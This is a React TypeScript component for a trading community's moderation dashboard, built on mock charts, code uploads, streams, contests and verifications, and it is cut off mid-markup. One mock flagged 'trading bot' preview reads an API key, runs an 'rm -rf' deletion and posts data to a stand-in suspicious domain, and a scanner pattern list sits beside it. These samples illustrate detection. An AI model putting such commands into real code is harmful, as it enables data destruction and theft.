"use client"

import React, { useState } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog"
import { 
  ChartBar, Code, Video, BookOpen, Trophy, Shield, AlertTriangle,
  Eye, EyeOff, CheckCircle, XCircle, Play, Pause, Download,
  Flag, Users, Activity, TrendingUp, Brain, FileText, 
  Upload, Search, Filter, Crown, Star, Zap, Lock, Unlock,
  MessageSquare, Heart, Share2, BarChart3, MonitorSpeaker,
  Calendar, DollarSign, Target, Clock, Award
} from "lucide-react"
import { toast } from "sonner"

interface EnhancedCommunityManagementProps {
  className?: string
}

export default function EnhancedCommunityManagement({ className }: EnhancedCommunityManagementProps) {
  const [selectedTab, setSelectedTab] = useState("charts")
  const [showApprovalModal, setShowApprovalModal] = useState(false)
  const [selectedItem, setSelectedItem] = useState<any>(null)

  // Mock data for enhanced community features
  const mockPendingCharts = [
    {
      id: 'chart_1',
      title: 'TSLA Breakout Analysis',
      author: 'TradingGuru',
      authorId: 'user_123',
      uploadDate: '2024-01-15T10:30:00Z',
      fileSize: '2.1 MB',
      dimensions: '1920x1080',
      symbol: 'TSLA',
      prediction: 'Bullish - $280 target',
      confidence: 85,
      status: 'pending',
      reports: 0,
      views: 0,
      likes: 0,
      imageUrl: '/api/placeholder/400/300',
      aiScanResult: {
        safe: true,
        inappropriateContent: false,
        marketManipulation: false,
        confidenceScore: 95
      }
    },
    {
      id: 'chart_2', 
      title: 'SPY Technical Analysis',
      author: 'ChartMaster',
      authorId: 'user_456',
      uploadDate: '2024-01-15T09:15:00Z',
      fileSize: '1.8 MB',
      dimensions: '1600x900',
      symbol: 'SPY',
      prediction: 'Bearish - $410 target',
      confidence: 72,
      status: 'flagged',
      reports: 2,
      views: 0,
      likes: 0,
      imageUrl: '/api/placeholder/400/300',
      aiScanResult: {
        safe: false,
        inappropriateContent: false,
        marketManipulation: true,
        confidenceScore: 78
      }
    }
  ]

  const mockPendingCode = [
    {
      id: 'code_1',
      title: 'Advanced Pine Script Strategy',
      author: 'AlgoMaster',
      authorId: 'user_789',
      language: 'pine',
      uploadDate: '2024-01-15T11:00:00Z',
      codeSize: '15.2 KB',
      lines: 450,
      status: 'pending',
      downloads: 0,
      likes: 0,
      securityScan: {
        safe: true,
        maliciousCode: false,
        externalConnections: false,
        suspiciousPatterns: [],
        confidenceScore: 98
      },
      codePreview: `//Strategic Moving Average Crossover
//@version=5
strategy("Advanced MA Strategy", overlay=true)

// Input parameters
fast_ma = input.int(12, "Fast MA")
slow_ma = input.int(26, "Slow MA")

// Calculate moving averages
ma_fast = ta.ema(close, fast_ma)
ma_slow = ta.ema(close, slow_ma)

// Entry conditions
long_condition = ta.crossover(ma_fast, ma_slow)
short_condition = ta.crossunder(ma_fast, ma_slow)

if long_condition
    strategy.entry("Long", strategy.long)
if short_condition
    strategy.entry("Short", strategy.short)`
    },
    {
      id: 'code_2',
      title: 'Python Trading Bot',
      author: 'PyTrader',
      authorId: 'user_321',
      language: 'python',
      uploadDate: '2024-01-15T08:45:00Z',
      codeSize: '8.7 KB',
      lines: 280,
      status: 'flagged',
      downloads: 0,
      likes: 0,
      securityScan: {
        safe: false,
        maliciousCode: false,
        externalConnections: true,
        suspiciousPatterns: ['requests.post', 'subprocess.call'],
        confidenceScore: 65
      },
      codePreview: `import requests
import subprocess
import os

class TradingBot:
    def __init__(self):
        self.api_key = os.getenv('API_KEY')
        
    def execute_trade(self, symbol, action):
        # Suspicious external call
        subprocess.call(['rm', '-rf', '/tmp/logs'])
        return requests.post('http://suspicious-domain.com/api', {...})`
    }
  ]

  const mockLiveStreams = [
    {
      id: 'stream_1',
      title: 'Live SPY Options Analysis',
      streamer: 'OptionsKing',
      streamerId: 'user_555',
      status: 'live',
      viewers: 1247,
      startTime: '2024-01-15T13:00:00Z',
      duration: '02:34:15',
      category: 'options',
      isRecording: true,
      chatEnabled: true,
      moderators: ['mod_1', 'mod_2'],
      reportCount: 0,
      streamHealth: 'excellent',
      bandwidth: '3.2 Mbps'
    },
    {
      id: 'stream_2',
      title: 'Crypto Trading Masterclass',
      streamer: 'CryptoGuru',
      streamerId: 'user_666',
      status: 'scheduled',
      viewers: 0,
      startTime: '2024-01-15T15:00:00Z',
      duration: '00:00:00',
      category: 'crypto',
      isRecording: false,
      chatEnabled: true,
      moderators: ['mod_3'],
      reportCount: 3,
      streamHealth: 'good',
      bandwidth: '0 Mbps'
    }
  ]

  const mockCompetitions = [
    {
      id: 'comp_1',
      title: 'January Strategy Contest',
      status: 'active',
      startDate: '2024-01-01T00:00:00Z',
      endDate: '2024-01-31T23:59:59Z',
      prizePool: 5000,
      participants: 847,
      entries: 1203,
      rules: 'Best performing strategy over 30 days',
      category: 'strategy',
      winners: null,
      submissions: {
        pending: 23,
        approved: 1180,
        rejected: 0
      }
    },
    {
      id: 'comp_2',
      title: 'Best Chart Analysis',
      status: 'upcoming',
      startDate: '2024-02-01T00:00:00Z',
      endDate: '2024-02-28T23:59:59Z',
      prizePool: 2500,
      participants: 0,
      entries: 0,
      rules: 'Most accurate technical analysis prediction',
      category: 'charts',
      winners: null,
      submissions: {
        pending: 0,
        approved: 0,
        rejected: 0
      }
    }
  ]

  const mockUserVerifications = [
    {
      id: 'verify_1',
      userId: 'user_111',
      username: 'ProTrader2024',
      requestType: 'professional',
      submittedDate: '2024-01-14T16:20:00Z',
      documents: [
        { type: 'trading_certificate', status: 'verified', name: 'CFA_Certificate.pdf' },
        { type: 'performance_record', status: 'pending', name: 'Trading_Records_2023.xlsx' },
        { type: 'identity', status: 'verified', name: 'Driver_License.jpg' }
      ],
      tradingExperience: '8 years',
      specialties: ['Options Trading', 'Technical Analysis'],
      verificationLevel: 'pending',
      adminNotes: ''
    }
  ]

  const handleApproveChart = (chartId: string) => {
    console.log(`Approving chart: ${chartId}`)
    toast.success('Chart approved and published!')
  }

  const handleRejectChart = (chartId: string, reason: string) => {
    console.log(`Rejecting chart: ${chartId}, reason: ${reason}`)
    toast.success('Chart rejected and removed!')
  }

  const handleApproveCode = (codeId: string) => {
    console.log(`Approving code: ${codeId}`)
    toast.success('Code approved and published!')
  }

  const handleRejectCode = (codeId: string, reason: string) => {
    console.log(`Rejecting code: ${codeId}, reason: ${reason}`)
    toast.success('Code rejected and removed!')
  }

  const handleStreamAction = (streamId: string, action: 'pause' | 'stop' | 'moderate') => {
    console.log(`Stream action: ${action} on ${streamId}`)
    toast.success(`Stream ${action} executed!`)
  }

  const handleCompetitionUpdate = (compId: string, action: string) => {
    console.log(`Competition ${action}: ${compId}`)
    toast.success(`Competition ${action} successful!`)
  }

  const handleUserVerification = (userId: string, status: 'approve' | 'reject', level?: string) => {
    console.log(`User verification: ${status} for ${userId} at level ${level}`)
    toast.success(`User verification ${status}d!`)
  }

  return (
    <div className={`space-y-8 ${className}`}>
      {/* Enhanced Header */}
      <div className="flex flex-col lg:flex-row justify-between items-start lg:items-center gap-4">
        <div>
          <h1 className="text-3xl font-bold bg-gradient-to-r from-blue-400 to-cyan-400 bg-clip-text text-transparent mb-2">
            Enhanced Community Management
          </h1>
          <p className="text-gray-400">
            Advanced controls for charts, code, live streams, competitions & user verification
          </p>
        </div>
        
        <div className="flex items-center gap-3">
          <Badge variant="outline" className="border-green-500 text-green-400">
            <Activity className="w-3 h-3 mr-1" />
            All Systems Online
          </Badge>
          <Button variant="outline" className="border-blue-500 text-blue-400">
            <BarChart3 className="w-4 h-4 mr-2" />
            Analytics Dashboard
          </Button>
        </div>
      </div>

      {/* Enhanced Stats Grid */}
      <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4">
        <Card className="bg-gradient-to-br from-blue-900/20 to-blue-800/20 border-blue-500/30">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm text-blue-300">Charts Pending</p>
                <p className="text-2xl font-bold text-blue-400">{mockPendingCharts.length}</p>
              </div>
              <ChartBar className="w-6 h-6 text-blue-400" />
            </div>
          </CardContent>
        </Card>

        <Card className="bg-gradient-to-br from-green-900/20 to-green-800/20 border-green-500/30">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm text-green-300">Code Reviews</p>
                <p className="text-2xl font-bold text-green-400">{mockPendingCode.length}</p>
              </div>
              <Code className="w-6 h-6 text-green-400" />
            </div>
          </CardContent>
        </Card>

        <Card className="bg-gradient-to-br from-red-900/20 to-red-800/20 border-red-500/30">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm text-red-300">Live Streams</p>
                <p className="text-2xl font-bold text-red-400">{mockLiveStreams.filter(s => s.status === 'live').length}</p>
              </div>
              <MonitorSpeaker className="w-6 h-6 text-red-400" />
            </div>
          </CardContent>
        </Card>

        <Card className="bg-gradient-to-br from-purple-900/20 to-purple-800/20 border-purple-500/30">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm text-purple-300">Competitions</p>
                <p className="text-2xl font-bold text-purple-400">{mockCompetitions.length}</p>
              </div>
              <Trophy className="w-6 h-6 text-purple-400" />
            </div>
          </CardContent>
        </Card>

        <Card className="bg-gradient-to-br from-orange-900/20 to-orange-800/20 border-orange-500/30">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm text-orange-300">Verifications</p>
                <p className="text-2xl font-bold text-orange-400">{mockUserVerifications.length}</p>
              </div>
              <Shield className="w-6 h-6 text-orange-400" />
            </div>
          </CardContent>
        </Card>

        <Card className="bg-gradient-to-br from-cyan-900/20 to-cyan-800/20 border-cyan-500/30">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm text-cyan-300">AI Security</p>
                <p className="text-2xl font-bold text-cyan-400">98%</p>
              </div>
              <Brain className="w-6 h-6 text-cyan-400" />
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Enhanced Tabs */}
      <Tabs value={selectedTab} onValueChange={setSelectedTab} className="space-y-6">
        <TabsList className="grid w-full grid-cols-6 bg-gray-900">
          <TabsTrigger value="charts" className="flex items-center gap-2">
            <ChartBar className="w-4 h-4" />
            Charts
          </TabsTrigger>
          <TabsTrigger value="code" className="flex items-center gap-2">
            <Code className="w-4 h-4" />
            Code
          </TabsTrigger>
          <TabsTrigger value="streams" className="flex items-center gap-2">
            <Video className="w-4 h-4" />
            Streams
          </TabsTrigger>
          <TabsTrigger value="competitions" className="flex items-center gap-2">
            <Trophy className="w-4 h-4" />
            Contests
          </TabsTrigger>
          <TabsTrigger value="verification" className="flex items-center gap-2">
            <Shield className="w-4 h-4" />
            Verify
          </TabsTrigger>
          <TabsTrigger value="analytics" className="flex items-center gap-2">
            <BarChart3 className="w-4 h-4" />
            Analytics
          </TabsTrigger>
        </TabsList>

        {/* Chart Management */}
        <TabsContent value="charts" className="space-y-6">
          <div className="flex justify-between items-center">
            <h3 className="text-xl font-semibold text-white">Chart Upload Moderation</h3>
            <div className="flex gap-2">
              <Button size="sm" variant="outline">
                <Filter className="w-4 h-4 mr-2" />
                Filter
              </Button>
              <Button size="sm" variant="outline">
                <Download className="w-4 h-4 mr-2" />
                Export
              </Button>
            </div>
          </div>

          <div className="grid gap-6">
            {mockPendingCharts.map((chart) => (
              <Card key={chart.id} className={`${
                chart.status === 'flagged' 
                  ? 'bg-red-900/20 border-red-500/30' 
                  : 'bg-gray-900/50 border-gray-700'
              }`}>
                <CardContent className="p-6">
                  <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                    {/* Chart Preview */}
                    <div>
                      <img 
                        src={chart.imageUrl} 
                        alt={chart.title}
                        className="w-full h-48 object-cover rounded-lg border border-gray-600"
                      />
                      <div className="mt-3 space-y-2">
                        <Badge variant={chart.status === 'flagged' ? 'destructive' : 'secondary'}>
                          {chart.status}
                        </Badge>
                        {chart.reports > 0 && (
                          <Badge variant="destructive">
                            {chart.reports} Reports
                          </Badge>
                        )}
                      </div>
                    </div>

                    {/* Chart Details */}
                    <div className="space-y-4">
                      <div>
                        <h4 className="text-lg font-semibold text-white mb-2">{chart.title}</h4>
                        <div className="space-y-2 text-sm">
                          <div className="flex justify-between">
                            <span className="text-gray-400">Author:</span>
                            <span className="text-white">{chart.author}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">Symbol:</span>
                            <Badge variant="outline" className="border-blue-500 text-blue-400">
                              {chart.symbol}
                            </Badge>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">Prediction:</span>
                            <span className="text-white">{chart.prediction}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">Confidence:</span>
                            <span className="text-green-400">{chart.confidence}%</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">File Size:</span>
                            <span className="text-white">{chart.fileSize}</span>
                          </div>
                        </div>
                      </div>

                      {/* AI Scan Results */}
                      <div className="bg-gray-800/50 rounded-lg p-3">
                        <h5 className="font-semibold text-white mb-2 flex items-center gap-2">
                          <Brain className="w-4 h-4 text-cyan-400" />
                          AI Security Scan
                        </h5>
                        <div className="space-y-2 text-sm">
                          <div className="flex justify-between">
                            <span>Safety Score:</span>
                            <span className={`font-semibold ${
                              chart.aiScanResult.confidenceScore > 90 
                                ? 'text-green-400' 
                                : chart.aiScanResult.confidenceScore > 70
                                ? 'text-yellow-400'
                                : 'text-red-400'
                            }`}>
                              {chart.aiScanResult.confidenceScore}%
                            </span>
                          </div>
                          <div className="flex justify-between">
                            <span>Content Safe:</span>
                            <span className={chart.aiScanResult.safe ? 'text-green-400' : 'text-red-400'}>
                              {chart.aiScanResult.safe ? 'Yes' : 'No'}
                            </span>
                          </div>
                          <div className="flex justify-between">
                            <span>Market Manipulation:</span>
                            <span className={chart.aiScanResult.marketManipulation ? 'text-red-400' : 'text-green-400'}>
                              {chart.aiScanResult.marketManipulation ? 'Detected' : 'Clear'}
                            </span>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Actions */}
                    <div className="space-y-4">
                      <div className="space-y-3">
                        <Button 
                          className="w-full bg-green-600 hover:bg-green-700"
                          onClick={() => handleApproveChart(chart.id)}
                        >
                          <CheckCircle className="w-4 h-4 mr-2" />
                          Approve & Publish
                        </Button>
                        
                        <Button 
                          variant="destructive" 
                          className="w-full"
                          onClick={() => {
                            setSelectedItem(chart)
                            setShowApprovalModal(true)
                          }}
                        >
                          <XCircle className="w-4 h-4 mr-2" />
                          Reject Chart
                        </Button>
                        
                        <Button variant="outline" className="w-full">
                          <Eye className="w-4 h-4 mr-2" />
                          View Full Size
                        </Button>
                        
                        <Button variant="outline" className="w-full">
                          <Users className="w-4 h-4 mr-2" />
                          View Author Profile
                        </Button>
                      </div>

                      {/* Quick Stats */}
                      <div className="bg-gray-800/50 rounded-lg p-3">
                        <h5 className="font-semibold text-white mb-2">Quick Stats</h5>
                        <div className="grid grid-cols-3 gap-2 text-center text-sm">
                          <div>
                            <div className="text-blue-400 font-semibold">{chart.views}</div>
                            <div className="text-gray-400">Views</div>
                          </div>
                          <div>
                            <div className="text-red-400 font-semibold">{chart.likes}</div>
                            <div className="text-gray-400">Likes</div>
                          </div>
                          <div>
                            <div className="text-orange-400 font-semibold">{chart.reports}</div>
                            <div className="text-gray-400">Reports</div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        </TabsContent>

        {/* Code Management */}
        <TabsContent value="code" className="space-y-6">
          <div className="flex justify-between items-center">
            <h3 className="text-xl font-semibold text-white">Code Repository Moderation</h3>
            <div className="flex gap-2">
              <Button size="sm" variant="outline">
                <Shield className="w-4 h-4 mr-2" />
                Security Scan
              </Button>
              <Button size="sm" variant="outline">
                <Download className="w-4 h-4 mr-2" />
                Export All
              </Button>
            </div>
          </div>

          <div className="grid gap-6">
            {mockPendingCode.map((code) => (
              <Card key={code.id} className={`${
                code.status === 'flagged' 
                  ? 'bg-red-900/20 border-red-500/30' 
                  : 'bg-gray-900/50 border-gray-700'
              }`}>
                <CardContent className="p-6">
                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                    {/* Code Preview & Details */}
                    <div className="space-y-4">
                      <div>
                        <h4 className="text-lg font-semibold text-white mb-2">{code.title}</h4>
                        <div className="grid grid-cols-2 gap-4 text-sm">
                          <div>
                            <span className="text-gray-400">Author:</span>
                            <span className="text-white ml-2">{code.author}</span>
                          </div>
                          <div>
                            <span className="text-gray-400">Language:</span>
                            <Badge variant="outline" className="ml-2 border-green-500 text-green-400">
                              {code.language.toUpperCase()}
                            </Badge>
                          </div>
                          <div>
                            <span className="text-gray-400">Size:</span>
                            <span className="text-white ml-2">{code.codeSize}</span>
                          </div>
                          <div>
                            <span className="text-gray-400">Lines:</span>
                            <span className="text-white ml-2">{code.lines}</span>
                          </div>
                        </div>
                      </div>

                      {/* Code Preview */}
                      <div className="bg-gray-950 rounded-lg p-4 border border-gray-600">
                        <div className="flex items-center justify-between mb-3">
                          <span className="text-sm font-medium text-green-400">Code Preview</span>
                          <Badge variant="outline" className="text-xs">
                            {code.language}
                          </Badge>
                        </div>
                        <pre className="text-xs text-green-400 whitespace-pre-wrap overflow-x-auto">
                          {code.codePreview}
                        </pre>
                      </div>
                    </div>

                    {/* Security Scan & Actions */}
                    <div className="space-y-4">
                      {/* Security Scan Results */}
                      <div className="bg-gray-800/50 rounded-lg p-4">
                        <h5 className="font-semibold text-white mb-3 flex items-center gap-2">
                          <Shield className="w-4 h-4 text-cyan-400" />
                          Security Analysis
                        </h5>
                        <div className="space-y-3">
                          <div className="flex justify-between">
                            <span className="text-gray-400">Safety Score:</span>
                            <span className={`font-semibold ${
                              code.securityScan.confidenceScore > 90 
                                ? 'text-green-400' 
                                : code.securityScan.confidenceScore > 70
                                ? 'text-yellow-400'
                                : 'text-red-400'
                            }`}>
                              {code.securityScan.confidenceScore}%
                            </span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">Malicious Code:</span>
                            <span className={code.securityScan.maliciousCode ? 'text-red-400' : 'text-green-400'}>
                              {code.securityScan.maliciousCode ? 'Detected' : 'Clean'}
                            </span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">External Connections:</span>
                            <span className={code.securityScan.externalConnections ? 'text-yellow-400' : 'text-green-400'}>
                              {code.securityScan.externalConnections ? 'Found' : 'None'}
                            </span>
                          </div>
                          
                          {code.securityScan.suspiciousPatterns.length > 0 && (
                            <div>
                              <span className="text-gray-400">Suspicious Patterns:</span>
                              <div className="mt-1 space-y-1">
                                {code.securityScan.suspiciousPatterns.map((pattern, i) => (
                                  <Badge key={i} variant="destructive" className="text-xs mr-1">
                                    {pattern}
                                  </Badge>
                                ))}
                              </div>
                            </div>
                          )}
                        </div>
                      </div>

                      {/* Actions */}
                      <div className="space-y-3">
                        <Button 
                          className="w-full bg-green-600 hover:bg-green-700"
                          onClick={() => handleApproveCode(code.id)}
                          disabled={!code.securityScan.safe}
                        >
                          <CheckCircle className="w-4 h-4 mr-2" />
                          Approve & Publish
                        </Button>
                        
                        <Button 
                          variant="destructive" 
                          className="w-full"
                          onClick={() => {
                            setSelectedItem(code)
                            setShowApprovalModal(true)
                          }}
                        >
                          <XCircle className="w-4 h-4 mr-2" />
                          Reject Code
                        </Button>
                        
                        <div className="grid grid-cols-2 gap-2">
                          <Button variant="outline" size="sm">
                            <Download className="w-4 h-4 mr-2" />
                            Download
                          </Button>
                          <Button variant="outline" size="sm">
                            <Play className="w-4 h-4 mr-2" />
                            Test Run
                          </Button>
                        </div>
                      </div>

                      {/* Stats */}
                      <div className="bg-gray-800/50 rounded-lg p-3">
                        <div className="grid grid-cols-3 gap-2 text-center text-sm">
                          <div>
                            <div className="text-blue-400 font-semibold">{code.downloads}</div>
                            <div className="text-gray-400 text-xs">Downloads</div>
                          </div>
                          <div>
                            <div className="text-red-400 font-semibold">{code.likes}</div>
                            <div className="text-gray-400 text-xs">Stars</div>
                          </div>
                          <div>
                            <div className="text-green-400 font-semibold">{code.lines}</div>
                            <div className="text-gray-400 text-xs">Lines</div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        </TabsContent>

        {/* Live Stream Management */}
        <TabsContent value="streams" className="space-y-6">
          <div className="flex justify-between items-center">
            <h3 className="text-xl font-semibold text-white">Live Stream Management</h3>
            <div className="flex gap-2">
              <Button size="sm" variant="outline">
                <MonitorSpeaker className="w-4 h-4 mr-2" />
                Global Controls
              </Button>
              <Button size="sm" variant="outline">
                <Shield className="w-4 h-4 mr-2" />
                Moderation Panel
              </Button>
            </div>
          </div>

          <div className="grid gap-6">
            {mockLiveStreams.map((stream) => (
              <Card key={stream.id} className="bg-gray-900/50 border-gray-700">
                <CardContent className="p-6">
                  <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                    {/* Stream Info */}
                    <div>
                      <h4 className="text-lg font-semibold text-white mb-3">{stream.title}</h4>
                      <div className="space-y-2 text-sm">
                        <div className="flex justify-between">
                          <span className="text-gray-400">Streamer:</span>
                          <span className="text-white">{stream.streamer}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Status:</span>
                          <Badge variant={stream.status === 'live' ? 'default' : 'secondary'}>
                            {stream.status === 'live' ? (
                              <><div className="w-2 h-2 bg-red-500 rounded-full mr-2 animate-pulse"></div>LIVE</>
                            ) : (
                              stream.status.toUpperCase()
                            )}
                          </Badge>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Viewers:</span>
                          <span className="text-white">{stream.viewers.toLocaleString()}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Duration:</span>
                          <span className="text-white">{stream.duration}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Reports:</span>
                          <span className={stream.reportCount > 0 ? 'text-red-400' : 'text-green-400'}>
                            {stream.reportCount}
                          </span>
                        </div>
                      </div>
                    </div>

                    {/* Stream Health */}
                    <div className="space-y-4">
                      <div className="bg-gray-800/50 rounded-lg p-4">
                        <h5 className="font-semibold text-white mb-3">Stream Health</h5>
                        <div className="space-y-2 text-sm">
                          <div className="flex justify-between">
                            <span className="text-gray-400">Quality:</span>
                            <Badge variant={
                              stream.streamHealth === 'excellent' ? 'default' :
                              stream.streamHealth === 'good' ? 'secondary' : 'destructive'
                            }>
                              {stream.streamHealth}
                            </Badge>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">Bandwidth:</span>
                            <span className="text-white">{stream.bandwidth}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">Recording:</span>
                            <span className={stream.isRecording ? 'text-green-400' : 'text-gray-400'}>
                              {stream.isRecording ? 'Active' : 'Disabled'}
                            </span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">Chat:</span>
                            <span className={stream.chatEnabled ? 'text-green-400' : 'text-gray-400'}>
                              {stream.chatEnabled ? 'Enabled' : 'Disabled'}
                            </span>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Controls */}
                    <div className="space-y-3">
                      {stream.status === 'live' && (
                        <>
                          <Button 
                            variant="outline" 
                            className="w-full"
                            onClick={() => handleStreamAction(stream.id, 'pause')}
                          >
                            <Pause className="w-4 h-4 mr-2" />
                            Pause Stream
                          </Button>
                          <Button 
                            variant="destructive" 
                            className="w-full"
                            onClick={() => handleStreamAction(stream.id, 'stop')}
                          >
                            <XCircle className="w-4 h-4 mr-2" />
                            End Stream
                          </Button>
                        </>
                      )}
                      
                      <Button 
                        variant="outline" 
                        className="w-full"
                        onClick={() => handleStreamAction(stream.id, 'moderate')}
                      >
                        <Shield className="w-4 h-4 mr-2" />
                        Moderate Chat
                      </Button>
                      
                      <Button variant="outline" className="w-full">
                        <Eye className="w-4 h-4 mr-2" />
                        View Stream
                      </Button>
                      
                      <Button variant="outline" className="w-full">
                        <Download className="w-4 h-4 mr-2" />
                        Download Recording
                      </Button>

                      {/* Moderators */}
                      <div className="bg-gray-800/50 rounded-lg p-3">
                        <h6 className="text-sm font-semibold text-white mb-2">Moderators</h6>
                        <div className="flex flex-wrap gap-1">
                          {stream.moderators.map((mod, i) => (
                            <Badge key={i} variant="outline" className="text-xs">
                              {mod}
                            </Badge>
                          ))}
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        </TabsContent>

        {/* Competition Management */}
        <TabsContent value="competitions" className="space-y-6">
          <div className="flex justify-between items-center">
            <h3 className="text-xl font-semibold text-white">Competition Management</h3>
            <div className="flex gap-2">
              <Button size="sm">
                <Trophy className="w-4 h-4 mr-2" />
                Create Competition
              </Button>
              <Button size="sm" variant="outline">
                <DollarSign className="w-4 h-4 mr-2" />
                Manage Prizes
              </Button>
            </div>
          </div>

          <div className="grid gap-6">
            {mockCompetitions.map((comp) => (
              <Card key={comp.id} className="bg-gradient-to-r from-purple-900/20 to-indigo-900/20 border-purple-500/30">
                <CardContent className="p-6">
                  <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                    {/* Competition Info */}
                    <div>
                      <h4 className="text-xl font-semibold text-white mb-3 flex items-center gap-2">
                        <Trophy className="w-5 h-5 text-yellow-500" />
                        {comp.title}
                      </h4>
                      <div className="space-y-2 text-sm">
                        <div className="flex justify-between">
                          <span className="text-gray-400">Status:</span>
                          <Badge variant={comp.status === 'active' ? 'default' : 'secondary'}>
                            {comp.status.toUpperCase()}
                          </Badge>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Prize Pool:</span>
                          <span className="text-green-400 font-semibold">${comp.prizePool.toLocaleString()}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Participants:</span>
                          <span className="text-white">{comp.participants.toLocaleString()}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Entries:</span>
                          <span className="text-white">{comp.entries.toLocaleString()}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Category:</span>
                          <Badge variant="outline" className="border-blue-500 text-blue-400">
                            {comp.category}
                          </Badge>
                        </div>
                      </div>
                    </div>

                    {/* Submissions */}
                    <div>
                      <h5 className="font-semibold text-white mb-3">Submissions</h5>
                      <div className="space-y-3">
                        <div className="bg-gray-800/50 rounded-lg p-3">
                          <div className="grid grid-cols-3 gap-2 text-center text-sm">
                            <div>
                              <div className="text-yellow-400 font-semibold">{comp.submissions.pending}</div>
                              <div className="text-gray-400 text-xs">Pending</div>
                            </div>
                            <div>
                              <div className="text-green-400 font-semibold">{comp.submissions.approved}</div>
                              <div className="text-gray-400 text-xs">Approved</div>
                            </div>
                            <div>
                              <div className="text-red-400 font-semibold">{comp.submissions.rejected}</div>
                              <div className="text-gray-400 text-xs">Rejected</div>
                            </div>
                          </div>
                        </div>

                        <div className="text-sm">
                          <span className="text-gray-400">Rules:</span>
                          <p className="text-white mt-1">{comp.rules}</p>
                        </div>
                      </div>
                    </div>

                    {/* Controls */}
                    <div className="space-y-3">
                      {comp.status === 'active' && (
                        <Button 
                          className="w-full bg-purple-600 hover:bg-purple-700"
                          onClick={() => handleCompetitionUpdate(comp.id, 'view_submissions')}
                        >
                          <Eye className="w-4 h-4 mr-2" />
                          Review Submissions ({comp.submissions.pending})
                        </Button>
                      )}
                      
                      <Button 
                        variant="outline" 
                        className="w-full"
                        onClick={() => handleCompetitionUpdate(comp.id, 'edit')}
                      >
                        <FileText className="w-4 h-4 mr-2" />
                        Edit Competition
                      </Button>
                      
                      <Button 
                        variant="outline" 
                        className="w-full"
                        onClick={() => handleCompetitionUpdate(comp.id, 'leaderboard')}
                      >
                        <BarChart3 className="w-4 h-4 mr-2" />
                        View Leaderboard
                      </Button>

                      <Button variant="outline" className="w-full">
                        <DollarSign className="w-4 h-4 mr-2" />
                        Manage Prizes
                      </Button>

                      {comp.status === 'active' && (
                        <Button 
                          variant="destructive" 
                          className="w-full"
                          onClick={() => handleCompetitionUpdate(comp.id, 'end')}
                        >
                          <XCircle className="w-4 h-4 mr-2" />
                          End Competition
                        </Button>
                      )}

                      {/* Timeline */}
                      <div className="bg-gray-800/50 rounded-lg p-3 text-xs">
                        <div className="space-y-1">
                          <div className="flex justify-between">
                            <span className="text-gray-400">Start:</span>
                            <span className="text-white">{new Date(comp.startDate).toLocaleDateString()}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-400">End:</span>
                            <span className="text-white">{new Date(comp.endDate).toLocaleDateString()}</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        </TabsContent>

        {/* User Verification */}
        <TabsContent value="verification" className="space-y-6">
          <div className="flex justify-between items-center">
            <h3 className="text-xl font-semibold text-white">User Verification Management</h3>
            <div className="flex gap-2">
              <Button size="sm" variant="outline">
                <Shield className="w-4 h-4 mr-2" />
                Verification Standards
              </Button>
              <Button size="sm" variant="outline">
                <Crown className="w-4 h-4 mr-2" />
                Pro Trader Program
              </Button>
            </div>
          </div>

          <div className="grid gap-6">
            {mockUserVerifications.map((verification) => (
              <Card key={verification.id} className="bg-gray-900/50 border-gray-700">
                <CardContent className="p-6">
                  <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                    {/* User Info */}
                    <div>
